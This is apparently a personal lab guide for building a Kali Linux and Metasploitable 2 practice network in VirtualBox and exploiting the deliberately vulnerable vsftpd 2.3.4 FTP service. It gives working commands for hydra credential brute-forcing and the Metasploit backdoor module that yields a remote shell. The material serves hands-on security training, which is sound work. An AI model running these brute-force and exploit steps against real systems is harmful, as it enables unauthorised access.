# Hacking-Lab
Linux + Metasploitable 2: Exploits (FTP 21/22/23)
### Prerequisite

This setup assumes you have a general understanding of networks and basic linux commands. 

### Setup

1. Download Virtual Box.
2. Download Kali Linux. - extract files into folder
3. Download Metasploitable 2.- extract files into folder
4. VM setup: Kali
    1. In VirtualBox, add file. 
    2. Go to Settings, rename it. [HackingLab]
    3. In settings, select Network > NAT Network 10.200.0/24
    4. Select start and sign in. (Credentials can be found in the VM description page)
    5. Check VM connected to internet. [ifconfig + ping google.com] - stop ping CTRL + Shift + C
5. Install Pimp My Kali [optional but recommended] (~15-20 min)
    1. Google ‘pimpmykali github’
    2.  Scroll down to ‘Installation scripts’ and copy 
        
        git clone [https://github.com/Dewalt-arch/pimpmykali](https://github.com/Dewalt-arch/pimpmykali)
        
    3. Create folder Tools [mkdir Tools]
    4. Navigate to folder [cd Tools]
    5. Run [ ./pimpmykali.sh ]
    6. Type ‘N’ for New VM setup. 
        - As it goes through, it will ask about root and copying folders. Select Yes for all.
6. VM setup: Metaspoiltable 2
    1. In VirtualBox, add file/New. 
        1. Name: MS2 | Select Machine folder | Type: Linux | Version: Linux Other 64 bit
        2. Memory size: Default ok. > Next
        3. Hard disk: Use an existing virtual hard drive > Add Metasploitable.vmdk from extracted files > Create
        4. Connect it to network: Settings > Network > NAT Network > Select the same network as first VM.
        5. Start up the MS2 VM
    2. In Kali VM, open terminal and run netdiscover -r 10.0.200.0/24
    3. In Metasploitable VM, run ifconfig - compare the ip to the netdiscover list to confirm.
    
    ![Screenshot from 2023-04-12 12-48-24.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/20cac6de-34c1-4eb0-be15-56e177f203fd/Screenshot_from_2023-04-12_12-48-24.png)
    
7. Setup users + passwords
    1. On Kali VM, run nmap -p- -sV -oN MS2.txt {IP of MS2 VM}
    
    Let nmap run and move to next steps.
    
    1. Create a users list.
        1. In new terminal tab : nano Users.txt
        2. Add users list to include: 
            
            msfadmin
            service
            user
            postgres
            
        3. Exit. Save. Confirm list created: ls
    2. Create a passwords list.
        1. In new terminal tab : nano Passwords.txt
        2. Add passwords list to include: 
            
            msfadmin
            service
            user
            postgres
            
        3. Exit. Save. Confirm list created: ls + cat

### It’s Exploit Time!

1. Exploit port 21 FTP
    1. Review MS2.txt - Notice the service (vsftpd 2.3.4) - it’s outdated and thus vulnerable for exploiting. 😈
    2. Utilize the user/password lists to gain access. 
        
        hydra -L Users.txt -P Passwords.txt {IP of MS2 VM} 
        
        This list will show the logins/passwords from your list that match.
        
    3. Login to MS2 -- sign in with user/password credentials
        
        ftp {IP of MS2 VM} 
        
    4. Confirm in MS2 directory 
        
        ls or ifconfig
        
    5. Exit out of MS2 vm: 
        
        bye
        
    6. Use searchsploit tool to see vulnerabilities associated with version (2 should appear).
        
        searchsploit vsftpd 2.3.4
        
    7. Enter into Metasploit framework. Search 
        
        mfsconsole > search vsftpd 2.3.4
        
    8. Use exploit shown and view options.
        
        use 0 
        
        show options
        
    9. Set the target host.
        
        set rhosts 10.0.200.7 > show options
        
    
    1-2-3… exploit … once you enter this, the terminal should now be MS2. 
    
    Confirm you are on MS2 : ifconfig + whoami
